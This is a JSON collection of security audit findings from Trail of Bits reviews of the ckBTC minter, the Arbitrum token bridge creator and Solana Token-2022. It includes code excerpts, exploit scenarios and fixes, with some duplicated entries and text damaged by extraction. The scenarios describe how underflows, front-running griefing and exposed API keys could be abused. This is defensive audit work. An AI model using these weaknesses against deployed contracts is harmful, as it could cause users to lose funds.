        "body": "The retrieve_btc call deducts the kyt_fee from the requested withdrawal amount. The arithmetic operation (gure 6.1) is not checked for underow, and there is no prior explicit check that would guarantee that kyt_fee is greater than or equal to args.amount . The args.amount value is guaranteed to be at least retrieve_btc_min_amount (gure 6.2). This implies that an underow will not occur if retrieve_btc_min_amount is greater than or equal to kyc_fee . This is a sane assumption; however, the condition is not ensured by the minter code and relies entirely on the correct init /upgrade value conguration, which is subject to human error. let request = RetrieveBtcRequest { // NB. We charge the KYT fee from the retrieve amount. amount: args .amount - kyt_fee , address: parsed_address , block_index, received_at: ic_cdk ::api::time(), kyt_provider: Some (kyt_provider), }; Figure 2.1: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:178-185 ) let (min_amount, btc_network) = read_state(|s| (s.retrieve_btc_min_amount, s.btc_network)); if args.amount < min_amount { return Err (RetrieveBtcError::AmountTooLow(min_amount)); } Figure 2.2: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:122-125 ) Exploit Scenario The canister is upgraded with a new kyt_fee value that is larger than the current retrieve_btc_min_amount value and enables the amount to underow. Recommendations Short term, use a checked_sub to compute the amount and provide a comment explaining why the inequality holds. Long term, perform checked arithmetic for all critical operations, and add comments to the code explaining why the corresponding invariant holds. 3. Minters init and upgrade congs insu\u0000ciently validated Severity: Informational Diculty: High Type: Data Validation Finding ID: TOB-DFBTC-3 Target: bitcoin/ckbtc/minter",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Inconsistent error logging in minter ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf",
        "body": "We found log messages produced by the minter to be inconsistent (gures 4.1 versus 4.2) and sometimes ambiguous (gure 4.2). Making log messages more consistent would simplify auditing and monitoring of the system. let block_index = client .transfer(TransferArg { from_subaccount: None , to, fee: None , created_at_time: None , memo: Some (Memo::from(txid.to_vec())), amount: Nat ::from(amount), }) . await .map_err(|e| UpdateBalanceError::TemporarilyUnavailable(e. 1 ))??; Figure 4.1: The error code ( e.0 ) is ignored. ( bitcoin/ckbtc/minter/src/updates/update_balance.rs#L302-L312 ) let result = client .transfer(TransferArg { from_subaccount: Some (from_subaccount), to: Account { owner: minter , subaccount: None , }, fee: None , created_at_time: None , memo: None , amount: Nat ::from(amount), }) . await .map_err(|( code , msg)| { RetrieveBtcError::TemporarilyUnavailable( format! ( \"cannot enqueue a burn transaction: {} ( reject_code = {} )\" , msg, code )) })?; Figure 4.1: The error code is included in the log message. ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs#L236-L254 ) log!( P1, \"Minted {} {token_name} for account {caller_account} with value {}\" , DisplayOutpoint(&utxo.outpoint), DisplayAmount( utxo.value ), ); Figure 4.2: Without checking the code, it is unclear whether the value refers to the actual minted amount or the utxo.value . ( bitcoin/ckbtc/minter/src/updates/update_balance.rs#L199-L204 ) Recommendations Short term, review the log messages produced by the minter and change them to follow a consistent pattern. Long term, add instructions to the development guidelines on how to structure log messages.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of amount underow when retrieving BTC ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf",
        "body": "The retrieve_btc call deducts the kyt_fee from the requested withdrawal amount. The arithmetic operation (gure 6.1) is not checked for underow, and there is no prior explicit check that would guarantee that kyt_fee is greater than or equal to args.amount . The args.amount value is guaranteed to be at least retrieve_btc_min_amount (gure 6.2). This implies that an underow will not occur if retrieve_btc_min_amount is greater than or equal to kyc_fee . This is a sane assumption; however, the condition is not ensured by the minter code and relies entirely on the correct init /upgrade value conguration, which is subject to human error. let request = RetrieveBtcRequest { // NB. We charge the KYT fee from the retrieve amount. amount: args .amount - kyt_fee , address: parsed_address , block_index, received_at: ic_cdk ::api::time(), kyt_provider: Some (kyt_provider), }; Figure 2.1: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:178-185 ) let (min_amount, btc_network) = read_state(|s| (s.retrieve_btc_min_amount, s.btc_network)); if args.amount < min_amount { return Err (RetrieveBtcError::AmountTooLow(min_amount)); } Figure 2.2: ( bitcoin/ckbtc/minter/src/updates/retrieve_btc.rs:122-125 ) Exploit Scenario The canister is upgraded with a new kyt_fee value that is larger than the current retrieve_btc_min_amount value and enables the amount to underow. Recommendations Short term, use a checked_sub to compute the amount and provide a comment explaining why the inequality holds. Long term, perform checked arithmetic for all critical operations, and add comments to the code explaining why the corresponding invariant holds.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Minters init and upgrade congs insu\u0000ciently validated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf",
        "body": "The init and upgrade arguments are described by the InitArgs and UpdateArgs structures, which are used to initialize and modify the minters state. There is very little validation of these values, which could lead to a pathological state as described in the previous nding. For instance, the ecdsa_key_name can be congured to be empty, kyt_fee can be larger than retrieve_btc_min_amount , and retrieve_btc_min_amount and max_time_in_queue_nanos are unbounded in the u64 range (gure 3.1). impl CkBtcMinterState { pub fn reinit ( & mut self , InitArgs { btc_network, ecdsa_key_name, retrieve_btc_min_amount, ledger_id, max_time_in_queue_nanos, min_confirmations, mode, kyt_fee, kyt_principal, }: InitArgs , ) { self .btc_network = btc_network; self .ecdsa_key_name = ecdsa_key_name; self .retrieve_btc_min_amount = retrieve_btc_min_amount; self .ledger_id = ledger_id; self .max_time_in_queue_nanos = max_time_in_queue_nanos; self .mode = mode; self .kyt_principal = kyt_principal; if let Some (kyt_fee) = kyt_fee { self .kyt_fee = kyt_fee; } if let Some (min_confirmations) = min_confirmations { self .min_confirmations = min_confirmations; } } ... } Figure 3.1: ( bitcoin/ckbtc/minter/src/state.rs#L322-L350 ) Exploit Scenario The canister is upgraded with a value that breaks an assumption in the code, which leads to state corruption. Recommendations Short term, include additional validation of conguration values where applicable and ensure that the implementation is covered by unit tests. Long term, always validate all data provided by the system's users.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. KYT API keys are exposed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf",
        "body": "The KYT API keys reside in canister memory, which is replicated across the network. The Internet Computer assumes that part of the network can be malicious (Byzantine fault tolerance) and the network should continue to function without disruption even if it is. This is not the case for the KYT canister, as a rogue node could abuse the API keys to drain the funds on the associated Chainalysis accounts and cause a denial of service. This further weakens the decentralization and reliability of the KYT service, as the risk of having the funds drained without remuneration will discourage maintainers from providing access to Chainalysis accounts. Exploit Scenario A malicious node operator reads the Chainalysis API keys from the canister memory and uses them anonymously to drain the funds intended to ensure the correct functioning of the KYT canister. Recommendations Short term, document this limitation and provide a risk assessment. Long term, nd a way to hold node operators accountable for misuse of the KYT API keys. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. L2 runtime code does not contain constructor code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "Contracts that are being deployed to L2 via retryable tickets on L1 do not include information on their creation code. This can be dangerous and lead to inconsistencies in state. The contracts deployed to L2 are encoded in the L1TokenBridgeRetryableSenders sendRetryable function. bytes memory data = abi.encodeCall( L2AtomicTokenBridgeFactory.deployL2Contracts, ( L2RuntimeCode( l2.routerTemplate.code, l2.standardGatewayTemplate.code, l2.customGatewayTemplate.code, l2.wethGatewayTemplate.code, l2.wethTemplate.code, l2.upgradeExecutorTemplate.code, l2.multicallTemplate.code ), l1.router, l1.standardGateway, l1.customGateway, l1.wethGateway, l1.weth, l2StandardGatewayAddress, rollupOwner, aliasedL1UpgradeExecutor ) ); Figure 1.1: The L2 contracts template code is included in a retryable TX. (L1TokenBridgeRetryableSender.sol) In order to deploy the code on the L2 side, a generic constructor code is used to deploy the given runtime code. // create L2 router logic and upgrade address routerLogic = Create2.deploy( 0, OrbitSalts.UNSALTED, CreationCodeHelper.getCreationCodeFor(runtimeCode) ); Figure 1.2: The L1 provided runtime code is wrapped with a generic constructor code. (L2AtomicTokenBridgeFactory.sol) The eect is that the original constructor is stripped away, which can be dangerous and lead to errors. For example, this could result in the removal of disabling initializers for proxy implementations, or it could lead to referencing invalid addresses on L2 due to immutable addresses included in the runtime code that were valid on L1 (e.g., corrupting the DelegateCallAwares onlyDelegated modier). Exploit Scenario In another upgrade, an implementation contract that is deployed on L2 is left uninitialized. A malicious user initializes the implementation and is able to self destruct it. Recommendations Short term, consider passing in the contracts creation code instead of the runtime code. Long term, ensure that all proxy and logic contracts are initialized correctly by adding further tests to any kind of contract deployed via a ticket.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. L2 token bridge contract deployment can be griefed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "The retryable ticket deploying the L2 token bridge contracts can fail if the call is front-run resulting in a blocked state. When creating the token bridge, L1AtomicTokenBridgeCreator sends out two retryable tickets, one for creating the L2AtomicTokenBridgeFactory contract and one for calling L2AtomicTokenBridgeFactory.deployL2Contracts. These tickets are expected to be atomic in the sense that they are all executed together and guaranteed to succeed. However, once both retryable tickets are created and pending, a malicious user has the chance to manually redeem the rst ticket, creating the L1AtomicTokenBridgeCreator, and then insert a transaction before the second ticket is redeemed. If the user includes a call to L2AtomicTokenBridgeFactory.deployL2Contracts from any account other than the expected L1TokenBridgeRetryableSender, then the L2 contracts will be deployed at non-canonical addresses and will not match the addresses stored in the contract. The L2 contract addresses are dependent on the sender. This can be seen in the _getProxyAddress function, which computes the address of a TransparentUpgradeableProxy that is deployed by the L2AtomicTokenBridgeFactory using create2 given the salt calculated from the prex, the chain ID, and the sender. This sender is expected to be the L1TokenBridgeRetryableSender. function _getProxyAddress(bytes memory prefix, uint256 chainId) internal view returns (address) { return Create2.computeAddress( _getL2Salt(prefix, chainId), keccak256( abi.encodePacked( type(TransparentUpgradeableProxy).creationCode, abi.encode( canonicalL2FactoryAddress, _predictL2ProxyAdminAddress(chainId), bytes(\"\") ) ) ), canonicalL2FactoryAddress ); } //... function _getL2Salt(bytes memory prefix, uint256 chainId) internal view returns (bytes32) { return keccak256( abi.encodePacked( prefix, chainId, AddressAliasHelper.applyL1ToL2Alias(address(retryableSender)) ) ); } Figure 2.1: The L2 proxy address is computed. (L1AtomicTokenBridgeCreator.sol) The deployL2Contracts function can therefore be kept permissionlesssince only the deployments coming from the L1TokenBridgeRetryableSender are considered the canonical ones for the rollup. However, some of the contracts are deployed independently of the caller, at xed addresses using an unsalted create2 call, such as the UpgradeExecutor logic contract. // Create UpgradeExecutor logic and upgrade to it. address upExecutorLogic = Create2.deploy( 0, OrbitSalts.UNSALTED, CreationCodeHelper.getCreationCodeFor(runtimeCode) ); Figure 2.2: The upgrade executor logic is deployed at a xed address on L2. (L2AtomicTokenBridgeFactory.sol) As the address is xed, the contract cannot be redeployed to the same address once it has already been created. This essentially blocks any further calls to deployL2Contracts. In particular, this means that it is possible to block the second retryable ticket (coming from the L1TokenBridgeRetryableSender) that deploys the contracts at the precomputed addresses. The result is a mismatch in the stored deployment addresses, requiring a manual recovery. Exploit Scenario Bob, a malicious user, waits for the rollup owner to call createTokenBridge, starting the token bridge deployment process. On the rollup chain, Bob then manually redeems the rst ticket, which creates the L2 token bridge factory, and then calls deployL2Contracts from his own address. The rollup owner is not aware that their call fails. After many failed bridging attempts, the issue is discovered. The bridged funds are stuck, and the rollup owner is unable to recreate the L2 token bridge contracts via createTokenBridge. Recommendations Short term, ensure that the L2 bridge contract creation does not end up being blocked. Either deploy the currently unsalted contracts using create1 or make the create2 salt dependent on the sender by using _getL2Salt(OrbitSalts.UNSALTED). Long term, critically examine whether assumptionssuch as sending multiple retryable tickets being atomicare always valid and whether these can be exploited.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Incorrect L2 Multicall address predicted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "The calculation of the deployment address for the L2 Multicall is incorrect. The code for createTokenBridge predicts that the address of Multicall will be deployed on the L2 using the .codehash value of the Multicall template. function _predictL2Multicall(uint256 chainId) internal view returns (address) { return Create2.computeAddress( _getL2Salt(OrbitSalts.L2_MULTICALL, chainId), l2MulticallTemplate.codehash, canonicalL2FactoryAddress ); } Figure 3.1: The L2 Multicall address is predicted (L1AtomicTokenBridgeCreator.sol) A contracts code hash is the keccak256 hash of the contracts runtime code. The create2 opcode, however, computes the address using the contract's creation code. The Multicall contract is created using a retryable ticket containing the runtime code and wraps it with a generic creation code. // deploy multicall Create2.deploy( 0, _getL2Salt(OrbitSalts.L2_MULTICALL), CreationCodeHelper.getCreationCodeFor(l2Code.multicall) ); Figure 3.2: The Multicall contract is deployed on L2 using create2 (L2AtomicTokenBridgeFactory.sol) This disparity causes the createTokenBridge contract to predict an incorrect address for the L2 Multicall contract. It is worth noting that this issue was not discovered during testing because the tests do not check the initialization of the L2Multicall contract properly; etherjs getCode returns 0x when the account has no code instead of returning empty bytes (). Therefore, the expect statement in gure 3.3 passes for a non-deployed contract (i.e., because 0x.length > 0). async function checkL2MulticallInitialization(l2Multicall: ArbMulticall2) { // check l2Multicall is deployed const l2MulticallCode = await l2Provider.getCode(l2Multicall.address) expect(l2MulticallCode.length).to.be.gt(0) } Figure 3.3: The Multicall contract initialization unit test (tokenBridgeDeploymentTest.ts) Exploit Scenario A user makes RPC Multicalls on the rollup using the address stored in the L1 contract. However, the RPC calls fail because the Multicall address is invalid. Recommendations Short term, x the precomputed address calculation or consider using the contract creation code directly. function _predictL2Multicall(uint256 chainId) internal view returns (address) { return Create2.computeAddress( _getL2Salt(OrbitSalts.L2_MULTICALL, chainId), keccak256(CreationCodeHelper.getCreationCodeFor(l2MulticallTemplate.code)), canonicalL2FactoryAddress ); } Figure 3.3: The L2 Multicall address prediction is xed Long term, include end-to-end tests checking that the computed address actually matches the deployed address. Additionally, consider checking that the actual deployed code matches the expected template instead of checking whether or not the address has code. Finally, whenever an external API (e.g., etherjs) is used, it is of utmost importance to check the documentation to ensure that the values returned by the functions are the expected ones.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Rollup owner is assumed to be an EOA ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "The rollup owner is currently assumed to be an EOA (externally owned account); however, this is neither explicitly checked nor veried. Some proxy logic contracts must rst be initialized to protect against an unexpected initialization that can cause the execution of critical operations (e.g., selfdestruct). // sweep the balance to send the retryable and refund the difference // it is known that any eth previously in this contract can be extracted // tho it is not expected that this contract will have any eth retryableSender.sendRetryable{value: isUsingFeeToken ? 0 : address(this).balance}( RetryableParams( inbox, canonicalL2FactoryAddress, msg.sender, msg.sender, maxGasForContracts, gasPriceBid ), L2TemplateAddresses( l2RouterTemplate, l2StandardGatewayTemplate, l2CustomGatewayTemplate, isUsingFeeToken ? address(0) : l2WethGatewayTemplate, isUsingFeeToken ? address(0) : l2WethTemplate, address(l1Templates.upgradeExecutor), l2MulticallTemplate ), l1Deployment, l2Deployment.standardGateway, rollupOwner, msg.sender, AddressAliasHelper.applyL1ToL2Alias(upgradeExecutor), isUsingFeeToken ); Figure 4.1: The rollup owner address is passed as a parameter to the retryable ticket (L1AtomicTokenBridgeCreator.sol) The address is then included as an executor role in the upgrade executor contract. // init upgrade executor address[] memory executors = new address[](2); executors[0] = rollupOwner; executors[1] = aliasedL1UpgradeExecutor; IUpgradeExecutor(canonicalUpgradeExecutor).initialize(canonicalUpgradeExecutor, executors); Figure 4.2: The rollup owner is given the executor role in the upgrade executor (L2AtomicTokenBridgeFactory.sol) This implicitly assumes that the rollup owner will always be an EOA, as otherwise, if it was a contract, the address would be aliased to an L2 address. If this were the case, it would not be able to make the calls to the upgrade executor, because it has stored the unaliased L1 address. This assumption is not clearly stated and not veried on-chain. In order to prevent centralization issues, the rollups owner should be expected to be a timelock-controlled multisig contract. Exploit Scenario A multisig rollup owner creates a token bridge. The rollup owner is added as an executor to the upgrade executor. However, the owner is now unable to make any upgrade calls because the unaliased address has been stored. Recommendations Short term, document the assumption that the rollup owner is expected to be an EOA and consider explicitly checking whether or not the rollup owner is a contract. Additionally, both the aliased and unaliased address could be given executor control in the upgrade executor. Long term, revisit assumptions that may not be explicitly stated; include explicit checks for these, or ensure that no unexpected scenario is created. 5. Depositing before the token bridge is fully deployed can result in loss of funds Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-ARB-TBC-005 Target: contracts/tokenbridge/ethereum/L1AtomicTokenBridgeCreator.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Dangerous aliasing assumption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "Applying the L1-to-L2 alias for user-provided addresses depends on L1 contracts, which can cause aliasing addresses to point to invalid addresses. Both the excessFeeRefundAddress and the callValueRefundAddresstwo addresses that the user provides when createRetryableTicket is calledare aliased depending on whether the L1 address contains code. // if a refund address is a contract, we apply the alias to it // so that it can access its funds on the L2 // since the beneficiary and other refund addresses don't get rewritten by arb-os if (AddressUpgradeable.isContract(excessFeeRefundAddress)) { excessFeeRefundAddress = AddressAliasHelper.applyL1ToL2Alias(excessFeeRefundAddress); } if (AddressUpgradeable.isContract(callValueRefundAddress)) { // this is the beneficiary. be careful since this is the address that can cancel the retryable in the L2 callValueRefundAddress = AddressAliasHelper.applyL1ToL2Alias(callValueRefundAddress); } Figure 6.1: Aliasing of user provided addresses (AbsInbox.sol) Because it is not possible to reliably determine whether the user wants to use an aliased or unaliased version of a given L2 address, this step can lead to mistakes by erroneously applying an alias where it was not expected. This could cause the refund to be sent to a nonexistent address on L2, where it could be recovered only from its L1 counterpart, which could be an immutable contract. Exploit Scenario The following events occur:  Alice (EOA) deploys a random token contract using nonce 0 at address 0xabc on L1.  Alice also deploys a multisig contract using nonce 0 at address 0xabc on L2.  Alice creates a retryable ticket and species the callValueRefundAddress as the L2 multisig (at 0xabc).  The alias check converts 0xabc to a nonexistent address on L2 due to the unrelated L1 token contract.  Only L1 token contract is able to recover funds, but it does not contain logic to do so, as it is an immutable token contract. Recommendations Short term, clearly document the behavior and make it clear to a user that an alias will apply in certain cases. Consider not making any assumptions on behalf of the user and include o-chain checks and validations in a web app. Long term, consider adding further on-chain checks to ensure that the L1 contract is able to send retryable tickets and recover the funds when applying an alias.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. Unclear decimal units of provided amounts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "When creating retryable tickets, the caller must provide multiple token values in various units, which could be prone to errors. The createRetryableTicket function requires the user to provide various parameters in dierent units. function _createRetryableTicket( address to, uint256 l2CallValue, uint256 maxSubmissionCost, address excessFeeRefundAddress, address callValueRefundAddress, uint256 gasLimit, uint256 maxFeePerGas, uint256 amount, bytes calldata data ) internal returns (uint256) { // ensure the user's deposit alone will make submission succeed uint256 amountToBeMintedOnL2 = _fromNativeTo18Decimals(amount); if (amountToBeMintedOnL2 < (maxSubmissionCost + l2CallValue + gasLimit * maxFeePerGas)) { revert InsufficientValue( maxSubmissionCost + l2CallValue + gasLimit * maxFeePerGas, amountToBeMintedOnL2 ); } // ... ) Figure 7.1: The _createRetryableTicket function (AbsInbox.sol) The parameter amount is given in the native tokens decimal units. The parameters l2CallValue, maxSubmissionCost, and maxFeePerGas are denominated using 18 decimal units. Neither the parameter names nor the NatSpec comments suggest that the values are given in diering units, which can cause mistakes in integration. Exploit Scenario An optimistic cross-chain bridge and AMM protocol is built on top of Arbitrum. When integrating with an Orbit chain with non-standard decimals, the incorrect decimal units are hard coded into the token handler contract, causing values that are too high to be sent to the Orbit chain when bridging the native token. Recommendations Short term, consider making a clear distinction between the units depending on the chain. For example, on L1, all values will always be denominated in the native tokens decimal units, and on L2, all values will always be denominated using 18 decimal points. Long term, be aware of confusions that can arise when assumptions in the API are not clearly documented. Aim to remove the risk of mistakes by focusing on clear usability when interacting with the bridge contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Rollup owner is assumed to be an EOA ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "The rollup owner is currently assumed to be an EOA (externally owned account); however, this is neither explicitly checked nor veried. Some proxy logic contracts must rst be initialized to protect against an unexpected initialization that can cause the execution of critical operations (e.g., selfdestruct). // sweep the balance to send the retryable and refund the difference // it is known that any eth previously in this contract can be extracted // tho it is not expected that this contract will have any eth retryableSender.sendRetryable{value: isUsingFeeToken ? 0 : address(this).balance}( RetryableParams( inbox, canonicalL2FactoryAddress, msg.sender, msg.sender, maxGasForContracts, gasPriceBid ), L2TemplateAddresses( l2RouterTemplate, l2StandardGatewayTemplate, l2CustomGatewayTemplate, isUsingFeeToken ? address(0) : l2WethGatewayTemplate, isUsingFeeToken ? address(0) : l2WethTemplate, address(l1Templates.upgradeExecutor), l2MulticallTemplate ), l1Deployment, l2Deployment.standardGateway, rollupOwner, msg.sender, AddressAliasHelper.applyL1ToL2Alias(upgradeExecutor), isUsingFeeToken ); Figure 4.1: The rollup owner address is passed as a parameter to the retryable ticket (L1AtomicTokenBridgeCreator.sol) The address is then included as an executor role in the upgrade executor contract. // init upgrade executor address[] memory executors = new address[](2); executors[0] = rollupOwner; executors[1] = aliasedL1UpgradeExecutor; IUpgradeExecutor(canonicalUpgradeExecutor).initialize(canonicalUpgradeExecutor, executors); Figure 4.2: The rollup owner is given the executor role in the upgrade executor (L2AtomicTokenBridgeFactory.sol) This implicitly assumes that the rollup owner will always be an EOA, as otherwise, if it was a contract, the address would be aliased to an L2 address. If this were the case, it would not be able to make the calls to the upgrade executor, because it has stored the unaliased L1 address. This assumption is not clearly stated and not veried on-chain. In order to prevent centralization issues, the rollups owner should be expected to be a timelock-controlled multisig contract. Exploit Scenario A multisig rollup owner creates a token bridge. The rollup owner is added as an executor to the upgrade executor. However, the owner is now unable to make any upgrade calls because the unaliased address has been stored. Recommendations Short term, document the assumption that the rollup owner is expected to be an EOA and consider explicitly checking whether or not the rollup owner is a contract. Additionally, both the aliased and unaliased address could be given executor control in the upgrade executor. Long term, revisit assumptions that may not be explicitly stated; include explicit checks for these, or ensure that no unexpected scenario is created.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Depositing before the token bridge is fully deployed can result in loss of funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "If a user triggers a deposit in the L1 side of the token bridge before it is fully deployed, their deposit will not be executed as expected, and their funds will not be minted on the L2. Token bridge creation relies on the usage of two retryable tickets that will correctly set up the L2 side of the bridge. /** * @notice Deploy and initialize token bridge, both L1 and L2 sides, as part of a single TX. * @dev This is a single entrypoint of L1 token bridge creator. Function deploys L1 side of token bridge and then uses * 2 retryable tickets to deploy L2 side. 1st retryable deploys L2 factory. And then 'retryable sender' contract * is called to issue 2nd retryable which deploys and inits the rest of the contracts. L2 chain is determined by `inbox` parameter. * * * Token bridge can be deployed only once for certain inbox. Any further calls to `createTokenBridge` will revert * because L1 salts are already used at that point and L1 contracts are already deployed at canonical addresses for that inbox. * */ Figure 5.1: Documentation on the deployment of the token bridge (L1AtomicTokenBridgeCreator.sol) However, if the both tickets are not immediately redeemed, a deposit from the L1 will produce an incomplete deposit in L2. Exploit Scenario Alice starts the process of the token bridge deployment. A spike in the L2 activity causes the retryable tickets not to execute immediately. Bob is eager to use the L2, so he quickly deposits into the token bridge, even though the bridge is not fully deployed yet. If Bobs retryable ticket with the deposit is executed before the L2 of the bridge is ready, the retryable ticket will call an empty account and it will not revert, leaving Bob without the L2 counterpart of his tokens. Recommendations Short term, consider adding a front-end check to verify that the L2 counterpart deployment has succeeded. Provide a clear error to the client that the token bridge is not yet fully deployed yet and that any deposit will result in loss of funds. Long term, review the assumptions of the token bridge during its usage to ensure that the new deployment will not break any of them.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Token values in DeployHelper are not adjusted to token decimals ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-offchain-labs-arbitrum-token-bridge-creator-securityreview.pdf",
        "body": "The DeployHelper contract deploys helper contracts to the L2 chain through retryable tickets containing hard-coded values that could be chain- and token decimal-dependent. Certain helper contracts can be deployed in the DeployHelper contract as part of the rollup creation process. These helper contracts are sent via signed transactions. // Nick's CREATE2 Deterministic Deployment Proxy // https://github.com/Arachnid/deterministic-deployment-proxy address public constant NICK_CREATE2_DEPLOYER = 0x3fAB184622Dc19b6109349B94811493BF2a45362; uint256 public constant NICK_CREATE2_VALUE = 0.01 ether; bytes public constant NICK_CREATE2_PAYLOAD = hex\"04f8a58085174876e80083...\"; Figure 8.1: Aliasing of user-provided addresses (AbsInbox.sol) Before sending these L2 transactions, a retryable ticket is rst created in order to fund the deployer address. uint256 feeAmount = _value + submissionCost + GASLIMIT * maxFeePerGas; // fund the target L2 address if (_isUsingFeeToken) { IERC20Inbox(inbox).createRetryableTicket({ to: _l2Address, l2CallValue: _value, maxSubmissionCost: submissionCost, excessFeeRefundAddress: msg.sender, callValueRefundAddress: msg.sender, gasLimit: GASLIMIT, maxFeePerGas: maxFeePerGas, tokenTotalFeeAmount: feeAmount, data: \"\" }); } else { Figure 8.2: The token total fee amount is being calculated (DeployHelper.sol) The fee amount is computed in order to cover the L2 value, the submission cost (0 in the case of using a fee token), and the retryable TX gas cost. When creating a retryable ticket, the tokenTotalFeeAmount parameter is expected to be given in the native token decimal units, as it is converted to 18 decimals. This means that if the custom fee tokens decimals dier, then the actual token value that is sent will be miscalculated. When the bridge receives a token value that is too little, it will transfer the missing funds from msg.sender (DeployHelper), causing the transaction to revert. Exploit Scenario Alice creates a new rollup with her custom fee token that uses six decimal points. When deploying the helper contracts, due to the miscalculation, the Inbox requests a large amount of tokens (0.01e18 * (1e18 - 1e6) = 10M tokens) from the DeployHelper. As the DeployHelper has not given any token spending approval to the Inbox, this would result in a transaction failure. If the tokens are manually sent to the Inbox, a large part would be stuck in an unrecoverable address. Conversely, if the fee token uses decimal points greater than 18, then it is possible that too little value would be sent for the successful contract creation. Recommendations Short term, convert the value given in 18 decimal units to the native token decimal units (rounded up if needed). Long term, implement further testing that includes bounds on expected deployment costs. Additionally, avoid patterns that can cause confusion in function APIs. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Ok returned for malformed extension data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "In the get_extension_types function, if the account type-length-value (TLV) data is malformed and the TLV record data is truncated (i.e., the account data length is less than the start oset summed with the length of the TLV data), the function returns Ok rather than an error. fn get_extension_types (tlv_data: & [ u8 ]) -> Result < Vec <ExtensionType>, ProgramError> { let mut extension_types = vec! []; let mut start_index = 0 ; while start_index < tlv_data.len() { let tlv_indices = get_tlv_indices(start_index); if tlv_data.len() < tlv_indices.value_start { return Ok (extension_types); } Figure 1.1: https://github.com/solana-labs/solana-program-library/token/program-2022 /src/extension/mod.rs#L127-L134 Recommendations Short term, modify the get_extension_types function so that it returns an error if the TLV data is corrupt. This will ensure that the Token Program will not continue processing if the provided accounts extension data is corrupt.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Missing account ownership checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-solana-token-2022-program-securityreview.pdf",
        "body": "Every account that the Token Program operates on should be owned by the Token Program, but several instructions lack account ownership checks. The functions lacking checks include process_reallocate , process_withdraw_withheld_tokens_from_mint , and process_withdraw_withheld_tokens_from_accounts . Many of these functions have an implicit check for this condition in that they modify the account data, which is possible only if the account is owned by the Token Program; however, future changes to the associated code could remove this protection. For example, in the process_withdraw_withheld_tokens_from_accounts instruction, neither the mint_account_info nor destination_account_info parameter is checked to ensure the account is owned by the Token Program. While the mint accounts data is mutably borrowed, the account data is never written. As a result, an attacker could pass a forged account in place of the mint account. Conversely, the destination_account_info accounts data is updated by the instruction, so it must be owned by the Token Program. However, if an attacker can nd a way to spoof an account public key that matches the mint property in the destination account, he could bypass the implicit check. Recommendations Short term, as a defense-in-depth measure, add explicit checks of account ownership for all accounts passed to instructions. This will both improve the clarity of the codebase and remove the dependence on implicit checks, which may no longer hold true when updates occur.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
